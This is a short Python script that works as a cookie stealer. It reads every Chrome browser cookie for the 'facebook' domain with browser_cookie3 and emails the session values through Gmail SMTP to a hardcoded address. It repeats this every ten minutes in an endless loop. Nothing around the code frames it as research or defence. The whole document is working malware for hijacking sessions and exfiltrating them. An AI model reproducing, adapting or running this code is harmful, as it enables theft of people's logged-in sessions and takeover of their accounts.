
import browser_cookie3 as bc
import time
import smtplib
from email.message import EmailMessage as EM
import ssl


def getCookiesFromDomain(d):

    Cook={}
    chromeCookies = list(bc.chrome())

    for cookie in chromeCookies:

        if (d in cookie.domain):


            Cook[cookie.name]=cookie.value


    return Cook #return all cookies or nothing



def send_mail(d):

    email = '@gmail.com'
    passs = ''
    to_email = '10@gmail.com'
    from_email = email
    subject = d + " cookies"
    message = str(getCookiesFromDomain(d))
    msg = EM()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.set_content(message)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email, passs)
        smtp.sendmail(email, to_email, msg.as_string())

while True :


    send_mail('facebook')

    time.sleep(600)
